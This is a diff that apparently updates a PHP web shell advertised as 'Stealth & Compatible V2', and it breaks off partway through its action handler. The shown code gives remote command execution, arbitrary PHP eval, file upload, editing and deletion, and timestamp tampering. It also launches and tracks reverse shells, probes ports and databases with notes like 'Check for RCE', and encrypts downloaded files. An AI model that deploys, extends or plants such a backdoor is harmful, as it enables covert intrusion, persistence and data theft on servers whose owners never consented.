@@ -12,23 +12,24 @@ if (function_exists('apache_setenv')) {
 }
 if (ob_get_level()) ob_end_clean();
 
-define('SHELL_VERSION', 'Web Shell - Stealth & Secure');
+define('SHELL_VERSION', 'Web Shell - Stealth & Compatible V2');
 define('REVERSE_SHELL_DEFAULT_IP', '127.0.0.1');
 define('REVERSE_SHELL_DEFAULT_PORT', '4444');
 define('SHELL_PASSWORD', '1234shell'); 
 define('DATA_SEPARATOR', '/*__INTERNAL_' . 'DATA_START__*/');
 
-// SESSION REMOVED FOR STEALTH - DO NOT ADD session_start()
-// The Loader populates the global $_SESSION variable in RAM from headers.
+// Ghost params for downloads
+$g_k = 'PHPSSIDLOGINFODATARECOVESSRYSYSTEM';
+$g_v = 'SYSTEM32LOGFILEINSTANCE';
 
 function get_embedded_data() {
     $content = @file_get_contents(__FILE__);
     $parts = explode(DATA_SEPARATOR, $content);
     if (count($parts) > 1) {
         $json = base64_decode(trim($parts[1]));
-        return json_decode($json, true) ?: [];
+        return json_decode($json, true) ?: array();
     }
-    return [];
+    return array();
 }
 
 function save_embedded_data($key, $value) {
@@ -48,20 +49,219 @@ function get_store($key) {
     return isset($data[$key]) ? $data[$key] : null;
 }
 
-$action = $_POST['action'] ?? $_GET['action'] ?? '';
+$action = isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : '');
 
-// Virtual Session Initialization (Defaults if headers are empty)
+// Virtual Session Initialization
 if (empty($_SESSION['current_dir'])) { $_SESSION['current_dir'] = realpath(getcwd() ?: '.'); }
 if (empty($_SESSION['terminal_cwd'])) { $_SESSION['terminal_cwd'] = $_SESSION['current_dir']; }
-$_SESSION['reverse_shells'] = $_SESSION['reverse_shells'] ?? [];
+if (!isset($_SESSION['reverse_shells'])) { $_SESSION['reverse_shells'] = array(); }
 
-function is_shellexec_enabled() { if (!function_exists('shell_exec')) return false; $disabled = ini_get('disable_functions'); return $disabled ? !in_array('shell_exec', array_map('trim', explode(',', $disabled))) : true; }
+function is_shellexec_enabled() { 
+    if (!function_exists('shell_exec')) return false; 
+    $disabled = ini_get('disable_functions'); 
+    if ($disabled) {
+        $disabled_array = array_map('trim', explode(',', $disabled));
+        return !in_array('shell_exec', $disabled_array);
+    }
+    return true;
+}
+
 function get_os_type() { return strtoupper(substr(PHP_OS, 0, 3)); }
-function get_current_user_host() { $user = 'user'; if (is_shellexec_enabled()) { $whoami_user = trim(@shell_exec('whoami')); if (!empty($whoami_user)) { $user = $whoami_user; } else { $user = function_exists('get_current_user') ? (@get_current_user() ?: 'user') : 'user'; } } else { $user = function_exists('get_current_user') ? (@get_current_user() ?: 'user') : 'user'; } $hostname = function_exists('gethostname') ? (@gethostname() ?: 'host') : 'host'; return ['user' => $user, 'hostname' => $hostname]; }
-function formatBytes($bytes) { if (!is_numeric($bytes) || $bytes < 0) return 'N/A'; $units = ['B', 'KB', 'MB', 'GB', 'TB']; $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); return round($bytes / pow(1024, min($pow, count($units) - 1)), 2) . ' ' . $units[min($pow, count($units) - 1)]; }
-function getNetworkPorts() { if (is_shellexec_enabled() && get_os_type() !== 'WIN') { $output = @shell_exec('ss -tulnp 2>/dev/null'); if (!empty($output)) { $open_ports = []; $lines = array_filter(explode("\n", $output)); array_shift($lines); foreach ($lines as $line) { $parts = preg_split('/\s+/', trim($line)); if (count($parts) < 5) continue; $protocol = $parts[0]; $local_address_port = $parts[4]; $process_info = $parts[count($parts) - 1]; if (!preg_match('/[:\.](\d+)$/', $local_address_port, $port_matches)) continue; $port = $port_matches[1]; $process_name = 'N/A'; if (preg_match('/users:\(\("([^"]+)"/', $process_info, $process_matches)) { $process_name = $process_matches[1]; } $open_ports[$protocol . ':' . $port] = ['protocol' => $protocol, 'port' => $port, 'process' => $process_name]; } if (empty($open_ports)) return [['status' => 'info', 'message' => '`ss -tulnp` ran but no listening ports were found.']]; $sorted_ports = array_values($open_ports); usort($sorted_ports, fn($a, $b) => $a['port'] <=> $b['port']); return $sorted_ports; } } $ports_to_scan = [21, 22, 80, 443, 3306, 5432, 8080]; $open_ports_fallback = []; foreach ($ports_to_scan as $port) { $connection = @fsockopen('127.0.0.1', $port, $errno, $errstr, 0.2); if (is_resource($connection)) { $open_ports_fallback[] = ['protocol' => 'tcp', 'port' => $port, 'process' => 'N/A']; fclose($connection); } } return empty($open_ports_fallback) ? [['status' => 'info', 'message' => 'Fallback: No open ports found from common list via fsockopen.']] : $open_ports_fallback; }
-function getDatabaseInfo($open_ports) { $databases = [ 'MySQL/MariaDB' => ['p' => 'mysqld', 'port' => 3306], 'PostgreSQL' => ['p' => 'postgres', 'port' => 5432], 'MongoDB' => ['p' => 'mongod', 'port' => 27017], 'Redis' => ['p' => 'redis-server', 'port' => 6379] ]; $detected = []; if (isset($open_ports[0]['status'])) { return [['status' => 'info', 'message' => 'Cannot detect databases; no open port data available.']]; } foreach ($databases as $name => $db_meta) { foreach ($open_ports as $port_info) { if (stripos($port_info['process'], $db_meta['p']) !== false || $port_info['port'] == $db_meta['port']) { $process_display_name = $port_info['process']; if ($process_display_name === 'N/A' && $port_info['port'] == $db_meta['port']) { $process_display_name = $db_meta['p'] . ' (inferred from port)'; } $details = ['Port' => $port_info['port'], 'Process Name' => $process_display_name]; if (is_shellexec_enabled()) { switch ($name) { case 'MySQL/MariaDB': $version_output = @shell_exec('mysqld --version 2>/dev/null'); if (preg_match('/Ver\s+([^\s,]+)/', $version_output, $matches)) { $details['Version'] = $matches[1]; } $details['Default User'] = 'root'; $details['Connect Command'] = '`mysql -h 127.0.0.1 -u root -p`'; break; case 'PostgreSQL': $version_output = @shell_exec('postgres --version 2>/dev/null'); if (preg_match('/(\d+\.\d+(\.\d+)?)/', $version_output, $matches)) { $details['Version'] = $matches[1]; } $details['Default User'] = 'postgres'; $details['Connect Command'] = '`psql -h 127.0.0.1 -U postgres`'; break; case 'MongoDB': $version_output = @shell_exec('mongod --version 2>/dev/null'); if (preg_match('/db version\s+v([^\s]+)/', $version_output, $matches)) { $details['Version'] = $matches[1]; } $details['Pentest Note'] = 'Older versions may have no auth by default.'; $details['Connect Command'] = '`mongo --host 127.0.0.1`'; break; case 'Redis': $info_output = @shell_exec('redis-cli INFO server 2>/dev/null'); if ($info_output) { $lines = explode("\r\n", $info_output); foreach($lines as $line) { if (strpos($line, ':') !== false) { list($key, $val) = explode(':', $line, 2); if (in_array($key, ['redis_version', 'os', 'redis_mode', 'tcp_port'])) { $details[ucfirst(str_replace('_', ' ', $key))] = $val; } } } } $details['Pentest Note'] = 'Often exposed without auth. Check for RCE.'; $details['Connect Command'] = '`redis-cli -h 127.0.0.1`'; break; } } $detected[] = [ 'service' => $name, 'details' => $details ]; continue 2; } } } return empty($detected) ? [['status' => 'info', 'message' => 'No common database services detected on open ports.']] : $detected; }
-function getSystemInfo() { $open_ports_data = getNetworkPorts(); $server_ip = $_SERVER['SERVER_ADDR'] ?? @gethostbyname($_SERVER['SERVER_NAME']) ?: 'N/A'; $user_host_info = get_current_user_host(); $available_commands = []; if (is_shellexec_enabled()) { $commands_to_check = ['curl', 'wget', 'python', 'perl', 'sudo', 'pkexec','gcc','make']; $is_win = get_os_type() === 'WIN'; foreach ($commands_to_check as $cmd) { $check_cmd = $is_win ? "where $cmd" : "command -v $cmd"; $output = @shell_exec($check_cmd . ' 2>/dev/null'); $available_commands[ucfirst($cmd)] = !empty(trim($output)) ? 'ON' : 'OFF'; } } return [ 'Shell Version' => SHELL_VERSION, 'OS' => php_uname(), 'PHP Version' => phpversion(), 'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A', 'User' => $user_host_info['user'], 'Hostname' => $user_host_info['hostname'], 'Server IP' => $server_ip, 'shell_exec Status' => is_shellexec_enabled() ? 'Enabled' : 'Disabled', 'Available Commands' => $available_commands, 'Disabled Functions' => ini_get('disable_functions') ?: 'None', 'Open Ports' => $open_ports_data, 'Database Services' => getDatabaseInfo($open_ports_data) ]; }
+
+function get_current_user_host() { 
+    $user = 'user'; 
+    if (is_shellexec_enabled()) { 
+        $whoami_user = trim(@shell_exec('whoami')); 
+        if (!empty($whoami_user)) { 
+            $user = $whoami_user; 
+        } else { 
+            $user = function_exists('get_current_user') ? (@get_current_user() ?: 'user') : 'user'; 
+        } 
+    } else { 
+        $user = function_exists('get_current_user') ? (@get_current_user() ?: 'user') : 'user'; 
+        if ($user === 'user' && function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
+            $u_info = posix_getpwuid(posix_geteuid());
+            if ($u_info) $user = $u_info['name'];
+        }
+    } 
+    $hostname = function_exists('gethostname') ? (@gethostname() ?: 'host') : 'host'; 
+    return array('user' => $user, 'hostname' => $hostname); 
+}
+
+function formatBytes($bytes) { 
+    if (!is_numeric($bytes) || $bytes < 0) return 'N/A'; 
+    $units = array('B', 'KB', 'MB', 'GB', 'TB'); 
+    $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); 
+    return round($bytes / pow(1024, min($pow, count($units) - 1)), 2) . ' ' . $units[min($pow, count($units) - 1)]; 
+}
+
+function getNetworkPorts() { 
+    if (is_shellexec_enabled() && get_os_type() !== 'WIN') { 
+        $output = @shell_exec('ss -tulnp 2>/dev/null'); 
+        if (!empty($output)) { 
+            $open_ports = array(); 
+            $lines = array_filter(explode("\n", $output)); 
+            array_shift($lines); 
+            foreach ($lines as $line) { 
+                $parts = preg_split('/\s+/', trim($line)); 
+                if (count($parts) < 5) continue; 
+                $protocol = $parts[0]; 
+                $local_address_port = $parts[4]; 
+                $process_info = $parts[count($parts) - 1]; 
+                if (!preg_match('/[:\.](\d+)$/', $local_address_port, $port_matches)) continue; 
+                $port = $port_matches[1]; 
+                $process_name = 'N/A'; 
+                if (preg_match('/users:\(\("([^"]+)"/', $process_info, $process_matches)) { 
+                    $process_name = $process_matches[1]; 
+                } 
+                $open_ports[$protocol . ':' . $port] = array('protocol' => $protocol, 'port' => $port, 'process' => $process_name); 
+            } 
+            if (empty($open_ports)) return array(array('status' => 'info', 'message' => '`ss -tulnp` ran but no listening ports were found.')); 
+            $sorted_ports = array_values($open_ports); 
+            usort($sorted_ports, function($a, $b) { return $a['port'] - $b['port']; }); 
+            return $sorted_ports; 
+        } 
+    } 
+    $ports_to_scan = array(21, 22, 80, 443, 3306, 5432, 8080); 
+    $open_ports_fallback = array(); 
+    foreach ($ports_to_scan as $port) { 
+        $connection = @fsockopen('127.0.0.1', $port, $errno, $errstr, 0.2); 
+        if (is_resource($connection)) { 
+            $open_ports_fallback[] = array('protocol' => 'tcp', 'port' => $port, 'process' => 'N/A'); 
+            fclose($connection); 
+        } 
+    } 
+    return empty($open_ports_fallback) ? array(array('status' => 'info', 'message' => 'Fallback: No open ports found from common list via fsockopen.')) : $open_ports_fallback; 
+}
+
+function getDatabaseInfo($open_ports) { 
+    $databases = array( 
+        'MySQL/MariaDB' => array('p' => 'mysqld', 'port' => 3306), 
+        'PostgreSQL' => array('p' => 'postgres', 'port' => 5432), 
+        'MongoDB' => array('p' => 'mongod', 'port' => 27017), 
+        'Redis' => array('p' => 'redis-server', 'port' => 6379) 
+    ); 
+    $detected = array(); 
+    if (isset($open_ports[0]['status'])) { 
+        return array(array('status' => 'info', 'message' => 'Cannot detect databases; no open port data available.')); 
+    } 
+    foreach ($databases as $name => $db_meta) { 
+        foreach ($open_ports as $port_info) { 
+            if (stripos($port_info['process'], $db_meta['p']) !== false || $port_info['port'] == $db_meta['port']) { 
+                $process_display_name = $port_info['process']; 
+                if ($process_display_name === 'N/A' && $port_info['port'] == $db_meta['port']) { 
+                    $process_display_name = $db_meta['p'] . ' (inferred from port)'; 
+                } 
+                $details = array('Port' => $port_info['port'], 'Process Name' => $process_display_name); 
+                if (is_shellexec_enabled()) { 
+                    switch ($name) { 
+                        case 'MySQL/MariaDB': 
+                            $version_output = @shell_exec('mysqld --version 2>/dev/null'); 
+                            if (preg_match('/Ver\s+([^\s,]+)/', $version_output, $matches)) { $details['Version'] = $matches[1]; } 
+                            $details['Default User'] = 'root'; 
+                            $details['Connect Command'] = '`mysql -h 127.0.0.1 -u root -p`'; 
+                            break; 
+                        case 'PostgreSQL': 
+                            $version_output = @shell_exec('postgres --version 2>/dev/null'); 
+                            if (preg_match('/(\d+\.\d+(\.\d+)?)/', $version_output, $matches)) { $details['Version'] = $matches[1]; } 
+                            $details['Default User'] = 'postgres'; 
+                            $details['Connect Command'] = '`psql -h 127.0.0.1 -U postgres`'; 
+                            break; 
+                        case 'MongoDB': 
+                            $version_output = @shell_exec('mongod --version 2>/dev/null'); 
+                            if (preg_match('/db version\s+v([^\s]+)/', $version_output, $matches)) { $details['Version'] = $matches[1]; } 
+                            $details['Pentest Note'] = 'Older versions may have no auth by default.'; 
+                            $details['Connect Command'] = '`mongo --host 127.0.0.1`'; 
+                            break; 
+                        case 'Redis': 
+                            $info_output = @shell_exec('redis-cli INFO server 2>/dev/null'); 
+                            if ($info_output) { 
+                                $lines = explode("\r\n", $info_output); 
+                                foreach($lines as $line) { 
+                                    if (strpos($line, ':') !== false) { 
+                                        list($key, $val) = explode(':', $line, 2); 
+                                        if (in_array($key, array('redis_version', 'os', 'redis_mode', 'tcp_port'))) { 
+                                            $details[ucfirst(str_replace('_', ' ', $key))] = $val; 
+                                        } 
+                                    } 
+                                } 
+                            } 
+                            $details['Pentest Note'] = 'Often exposed without auth. Check for RCE.'; 
+                            $details['Connect Command'] = '`redis-cli -h 127.0.0.1`'; 
+                            break; 
+                    } 
+                } 
+                $detected[] = array( 'service' => $name, 'details' => $details ); 
+                continue 2; 
+            } 
+        } 
+    } 
+    return empty($detected) ? array(array('status' => 'info', 'message' => 'No common database services detected on open ports.')) : $detected; 
+}
+
+function getSystemInfo() { 
+    $open_ports_data = getNetworkPorts(); 
+    $server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (@gethostbyname($_SERVER['SERVER_NAME']) ?: 'N/A'); 
+    $user_host_info = get_current_user_host(); 
+    $available_commands = array(); 
+    if (is_shellexec_enabled()) { 
+        $commands_to_check = array('curl', 'wget', 'python', 'perl', 'sudo', 'pkexec','gcc','make'); 
+        $is_win = get_os_type() === 'WIN'; 
+        foreach ($commands_to_check as $cmd) { 
+            $check_cmd = $is_win ? "where $cmd" : "command -v $cmd"; 
+            $output = @shell_exec($check_cmd . ' 2>/dev/null'); 
+            $available_commands[ucfirst($cmd)] = !empty(trim($output)) ? 'ON' : 'OFF'; 
+        } 
+    } 
+    
+    $loaded_extensions = implode(', ', get_loaded_extensions());
+    
+    $cpu_info = 'N/A';
+    if (is_readable('/proc/cpuinfo')) {
+        $cpu_data = @file_get_contents('/proc/cpuinfo');
+        if (preg_match('/model name\s+:\s+(.*)$/m', $cpu_data, $matches)) {
+            $cpu_info = $matches[1];
+        }
+    }
+    
+    $mem_info = 'N/A';
+    if (is_readable('/proc/meminfo')) {
+        $mem_data = @file_get_contents('/proc/meminfo');
+        if (preg_match('/MemTotal:\s+(.*)$/m', $mem_data, $matches)) {
+            $mem_info = $matches[1];
+        }
+    }
+    
+    $disk_info = 'N/A';
+    if (function_exists('disk_free_space') && function_exists('disk_total_space')) {
+        $disk_info = formatBytes(disk_free_space("/")) . " free of " . formatBytes(disk_total_space("/"));
+    }
+
+    return array( 
+        'Shell Version' => SHELL_VERSION, 
+        'OS' => php_uname(), 
+        'CPU Info' => $cpu_info,
+        'Memory Info' => $mem_info,
+        'Disk Space' => $disk_info,
+        'PHP Version' => phpversion(), 
+        'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A', 
+        'User' => $user_host_info['user'], 
+        'Hostname' => $user_host_info['hostname'], 
+        'Server IP' => $server_ip, 
+        'PHP SAPI' => php_sapi_name(),
+        'shell_exec Status' => is_shellexec_enabled() ? 'Enabled' : 'Disabled', 
+        'Disabled Functions' => ini_get('disable_functions') ?: 'None', 
+        'Open Basedir' => ini_get('open_basedir') ?: 'None',
+        'Safe Mode' => ini_get('safe_mode') ? 'ON' : 'OFF',
+        'Memory Limit' => ini_get('memory_limit'),
+        'Max Post Size' => ini_get('post_max_size'),
+        'Max Upload Size' => ini_get('upload_max_filesize'),
+        'Loaded Extensions' => $loaded_extensions,
+        'Available Commands' => $available_commands, 
+        'Open Ports' => $open_ports_data, 
+        'Database Services' => getDatabaseInfo($open_ports_data) 
+    ); 
+}
 
 function permsToSymbolic($perms) {
     if (($perms & 0xC000) == 0xC000) { $info = 's'; } 
@@ -90,7 +290,7 @@ function getFileInfo($path) {
     $p = @fileperms($path);
     $octal = $p ? substr(sprintf('%o', $p), -4) : '0000';
     $symbolic = $p ? permsToSymbolic($p) : '---------';
-    return [ 
+    return array( 
         'name' => basename($path), 
         'is_dir' => is_dir($path), 
         'type' => is_link($path) ? 'Symlink' : (is_dir($path) ? 'Directory' : 'File'), 
@@ -98,36 +298,296 @@ function getFileInfo($path) {
         'modified' => @filemtime($path) ? date("Y-m-d H:i:s", @filemtime($path)) : 'N/A', 
         'permissions' => $symbolic,
         'permissions_oct' => $octal
-    ]; 
+    ); 
 }
-function getDirectoryListing($dir) { $files = []; if (!$items = @scandir($dir)) return false; usort($items, function($a, $b) use ($dir) { if ($a === '..') return -1; if ($b === '..') return 1; $is_dir_a = is_dir($dir . DIRECTORY_SEPARATOR . $a); $is_dir_b = is_dir($dir . DIRECTORY_SEPARATOR . $b); if ($is_dir_a !== $is_dir_b) return $is_dir_a ? -1 : 1; return strcasecmp($a, $b); }); foreach ($items as $item) { if ($item == '.') continue; if ($info = getFileInfo($dir . DIRECTORY_SEPARATOR . $item)) $files[] = $info; } return $files; }
-function recursiveDeleteDirectory($dir) { if (!is_dir($dir)) return @unlink($dir); $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST); foreach ($iterator as $file) { if ($file->isDir()) @rmdir($file->getRealPath()); else @unlink($file->getRealPath()); } return @rmdir($dir); }
+function getDirectoryListing($dir) { 
+    $files = array(); 
+    if (!$items = @scandir($dir)) return false; 
+    usort($items, function($a, $b) use ($dir) { 
+        if ($a === '..') return -1; 
+        if ($b === '..') return 1; 
+        $is_dir_a = is_dir($dir . DIRECTORY_SEPARATOR . $a); 
+        $is_dir_b = is_dir($dir . DIRECTORY_SEPARATOR . $b); 
+        if ($is_dir_a !== $is_dir_b) return $is_dir_a ? -1 : 1; 
+        return strcasecmp($a, $b); 
+    }); 
+    foreach ($items as $item) { 
+        if ($item == '.') continue; 
+        if ($info = getFileInfo($dir . DIRECTORY_SEPARATOR . $item)) $files[] = $info; 
+    } 
+    return $files; 
+}
+function recursiveDeleteDirectory($dir) { 
+    if (!is_dir($dir)) return @unlink($dir); 
+    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST); 
+    foreach ($iterator as $file) { 
+        if ($file->isDir()) @rmdir($file->getRealPath()); 
+        else @unlink($file->getRealPath()); 
+    } 
+    return @rmdir($dir); 
+}
 
-if ($action === 'download' && isset($_GET['file'])) { if (isset($_SESSION['current_dir'])) { $file_path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . basename($_GET['file'])); if ($file_path && is_file($file_path) && is_readable($file_path)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . basename($file_path) . '"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file_path)); ob_clean(); flush(); readfile($file_path); exit; } } }
+function get_vault_key() { 
+    global $key; 
+    return isset($key) ? $key : (isset($_SERVER["HTTP_X_VAULT_KEY"]) ? $_SERVER["HTTP_X_VAULT_KEY"] : (isset($_COOKIE["v_key"]) ? $_COOKIE["v_key"] : null)); 
+}
+function vault_encrypt($data, $vkey) { 
+    if (!$vkey) return $data; 
+    $iv_len = openssl_cipher_iv_length("aes-256-cbc"); 
+    $iv = openssl_random_pseudo_bytes($iv_len); 
+    $encrypted = openssl_encrypt($data, "aes-256-cbc", $vkey, 0, $iv); 
+    return "VAULT:" . base64_encode($iv . $encrypted); 
+}
+function vault_decrypt($data, $vkey) { 
+    if (!$vkey || strpos($data, "VAULT:") !== 0) return $data; 
+    $raw = base64_decode(substr($data, 6)); 
+    $iv_len = openssl_cipher_iv_length("aes-256-cbc"); 
+    $iv = substr($raw, 0, $iv_len); 
+    $cipher = substr($raw, $iv_len); 
+    return openssl_decrypt($cipher, "aes-256-cbc", $vkey, 0, $iv); 
+}
+
+if ($action === 'download' && isset($_GET['file'])) { 
+    if (isset($_SESSION['current_dir'])) { 
+        $file_path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . basename($_GET['file'])); 
+        if ($file_path && is_file($file_path) && is_readable($file_path)) { 
+            $vkey = get_vault_key(); 
+            $decrypted = vault_decrypt(file_get_contents($file_path), $vkey); 
+            header('Content-Description: File Transfer'); 
+            header('Content-Type: application/octet-stream'); 
+            header('Content-Disposition: attachment; filename="' . basename($file_path) . '"'); 
+            header('Expires: 0'); 
+            header('Cache-Control: must-revalidate'); 
+            header('Pragma: public'); 
+            header('Content-Length: ' . strlen($decrypted)); 
+            ob_clean(); 
+            flush(); 
+            echo $decrypted; 
+            return; 
+        } 
+    } 
+}
 
 if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
     header('Content-Type: application/json');
-    $response = ['status' => 'error', 'message' => 'Invalid action'];
+    $response = array('status' => 'error', 'message' => 'Invalid action');
 
     switch ($action) {
-        case 'get_sysinfo': $response = ['status' => 'success', 'data' => getSystemInfo()]; break;
-        case 'get_processes': $output = is_shellexec_enabled() ? @shell_exec(get_os_type() === 'WIN' ? 'tasklist /V /FO CSV /NH' : 'ps auxww') : 'shell_exec is disabled.'; $response = ['status' => 'success', 'data' => $output ?: 'Command failed or no output.', 'os' => get_os_type()]; break;
-        case 'kill_process': if (!is_shellexec_enabled()) { $response['message'] = 'shell_exec is required.'; break; } $pid = filter_var($_POST['pid'] ?? '', FILTER_VALIDATE_INT); if ($pid) { $is_win = get_os_type() === 'WIN'; $command = $is_win ? "taskkill /PID {$pid} /F" : "kill -9 {$pid}"; @shell_exec($command . ' 2>&1'); $response = ['status' => 'success', 'message' => "Kill signal sent to PID {$pid}."]; } else { $response['message'] = 'Invalid PID provided.'; } break;
-        case 'php_eval': ob_start(); try { eval($_POST['code'] ?? ''); } catch (Throwable $t) { echo "Error: " . $t->getMessage(); } $response = ['status' => 'success', 'data' => ob_get_clean()]; break;
-        case 'execute_cmd': if (!is_shellexec_enabled()) { $response['message'] = 'shell_exec is disabled.'; break; } $cmd = trim($_POST['cmd'] ?? ''); if (preg_match('/^\s*cd\s+(.*)$/i', $cmd, $matches)) { $cd_cmd = 'cd ' . escapeshellarg($_SESSION['terminal_cwd']) . ' && cd ' . escapeshellarg(trim($matches[1] ?: '~')) . ' && ' . (get_os_type() === 'WIN' ? 'cd' : 'pwd'); $new_cwd = trim(@shell_exec($cd_cmd)); if ($new_cwd && is_dir($new_cwd)) { $_SESSION['terminal_cwd'] = $new_cwd; $response = ['status' => 'success', 'output' => '', 'cwd' => $new_cwd]; } else { $response['message'] = 'cd: No such file or directory'; } } else { $full_cmd = 'cd ' . escapeshellarg($_SESSION['terminal_cwd']) . ' && ' . $cmd . ' 2>&1'; $response = ['status' => 'success', 'output' => @shell_exec($full_cmd), 'cwd' => $_SESSION['terminal_cwd']]; } break;
-        case 'list_dir': $dir = realpath($_POST['dir'] ?? $_SESSION['current_dir']); if ($dir && is_dir($dir) && is_readable($dir)) { $_SESSION['current_dir'] = $dir; $response = ['status' => 'success', 'path' => $dir, 'listing' => getDirectoryListing($dir)]; } else { $response['message'] = 'Directory not found or not readable.'; } break;
-        case 'get_file_content': $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); if ($path && is_file($path) && is_readable($path)) { $response = ['status' => 'success', 'path' => $path, 'content' => file_get_contents($path)]; } else { $response['message'] = 'File not found or not readable.'; } break;
-        case 'save_file': if (file_put_contents($_POST['path'], $_POST['content'] ?? '') !== false) { $response = ['status' => 'success', 'message' => basename($_POST['path']) . ' saved.']; } else { $response['message'] = 'Failed to save file.'; } break;
-        case 'delete_item': $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); if ($path && (is_dir($path) ? recursiveDeleteDirectory($path) : @unlink($path))) { $response = ['status' => 'success', 'message' => basename($path) . ' deleted.']; } else { $response['message'] = 'Failed to delete ' . basename($path) . '.'; } break;
-        case 'create_item': $name = trim($_POST['name'] ?? ''); if ($name && strpbrk($name, "\\/?%*:|\"<>") === false) { $new_path = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $name; $type = $_POST['type']; if (file_exists($new_path)) { $response['message'] = 'Item already exists.'; } elseif (($type === 'dir' && @mkdir($new_path)) || ($type === 'file' && @touch($new_path))) { $response = ['status' => 'success', 'message' => ucfirst($type) . ' created.']; } else { $response['message'] = 'Creation failed.'; } } else { $response['message'] = 'Invalid name.'; } break;
-        case 'rename_item': $old_path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); $new_name = trim($_POST['new_name'] ?? ''); if ($old_path && !empty($new_name) && strpbrk($new_name, "\\/?%*:|\"<>") === false) { $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name; if (file_exists($new_path)) { $response['message'] = 'Destination name already exists.'; } elseif (@rename($old_path, $new_path)) { $response = ['status' => 'success', 'message' => basename($old_path) . ' renamed to ' . $new_name]; } else { $response['message'] = 'Rename failed. Check permissions.'; } } else { $response['message'] = 'Invalid old path or new name provided.'; } break;
-        case 'change_permissions': $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); $perms = $_POST['permissions'] ?? ''; if ($path && preg_match('/^[0-7]{3,4}$/', $perms)) { if (@chmod($path, octdec($perms))) { $response = ['status' => 'success', 'message' => 'Permissions for ' . basename($path) . ' set to ' . $perms]; } else { $response['message'] = 'Failed to set permissions.'; } } else { $response['message'] = 'Invalid path or permission format.'; } break;
-        case 'change_date': $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); $date_str = $_POST['new_date'] ?? 'now'; $timestamp = ($date_str === 'now') ? time() : strtotime($date_str); if ($path && $timestamp !== false) { if (@touch($path, $timestamp)) { $response = ['status' => 'success', 'message' => 'Timestamp for ' . basename($path) . ' updated.']; } else { $response['message'] = 'Failed to update timestamp.'; } } else { $response['message'] = 'Invalid path or date format.'; } break;
-        case 'upload_files': $count = 0; foreach ($_FILES['upload_files']['tmp_name'] as $i => $tmp_name) { if ($_FILES['upload_files']['error'][$i] == UPLOAD_ERR_OK) { if (move_uploaded_file($tmp_name, $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . basename($_FILES['upload_files']['name'][$i]))) $count++; } } $response = ['status' => 'success', 'message' => "$count file(s) uploaded."]; break;
-        case 'execute_revshell_cmd': if (!is_shellexec_enabled()) { $response['message'] = 'shell_exec is required.'; break; } $command = $_POST['command'] ?? ''; $rhost = $_POST['rhost'] ?? 'N/A'; $rport = $_POST['rport'] ?? 'N/A'; if (!empty($command)) { $bg_cmd = 'nohup ' . $command . ' > /dev/null 2>&1 & echo $!'; $pid = get_os_type() === 'WIN' ? 'N/A' : trim(@shell_exec($bg_cmd)); $_SESSION['reverse_shells'][uniqid()] = ['pid' => $pid, 'host' => $rhost, 'port' => $rport, 'time' => date('Y-m-d H:i:s')]; $response = ['status' => 'success', 'message' => 'Reverse shell command executed.', 'sessions' => $_SESSION['reverse_shells']]; } else { $response['message'] = 'Empty command.'; } break;
-        case 'get_revshell_sessions': $response = ['status' => 'success', 'sessions' => $_SESSION['reverse_shells']]; break;
-        case 'check_revshell_status': $statuses = []; $is_win = get_os_type() === 'WIN'; foreach ($_SESSION['reverse_shells'] as $id => $session) { $pid = $session['pid']; $is_running = false; if (is_numeric($pid) && $pid > 0 && is_shellexec_enabled()) { if ($is_win) { $output = @shell_exec("tasklist /FI \"PID eq {$pid}\""); if (strpos($output, (string)$pid) !== false) $is_running = true; } else { $output = @shell_exec("ps -p {$pid}"); if (count(explode("\n", trim($output))) > 1) $is_running = true; } } $statuses[$id] = $is_running ? 'Online' : 'Offline'; } $response = ['status' => 'success', 'statuses' => $statuses]; break;
-        case 'kill_revshell': $id = $_POST['id']; $pid = $_SESSION['reverse_shells'][$id]['pid']; if ($pid && $pid !== 'N/A') @shell_exec("kill -9 {$pid}"); unset($_SESSION['reverse_shells'][$id]); $response = ['status' => 'success', 'message' => 'Session terminated.', 'sessions' => $_SESSION['reverse_shells']]; break;
+        case 'get_sysinfo': $response = array('status' => 'success', 'data' => getSystemInfo()); break;
+        case 'get_processes': 
+            $output = 'shell_exec is disabled.';
+            if (is_shellexec_enabled()) {
+                $output = @shell_exec(get_os_type() === 'WIN' ? 'tasklist /V /FO CSV /NH' : 'ps auxww');
+            }
+            $response = array('status' => 'success', 'data' => $output ?: 'Command failed or no output.', 'os' => get_os_type()); 
+            break;
+        case 'kill_process': 
+            if (!is_shellexec_enabled()) { $response['message'] = 'shell_exec is required.'; break; } 
+            $pid = filter_var(isset($_POST['pid']) ? $_POST['pid'] : '', FILTER_VALIDATE_INT); 
+            if ($pid) { 
+                $is_win = get_os_type() === 'WIN'; 
+                $command = $is_win ? "taskkill /PID {$pid} /F" : "kill -9 {$pid}"; @shell_exec($command . ' 2>&1'); 
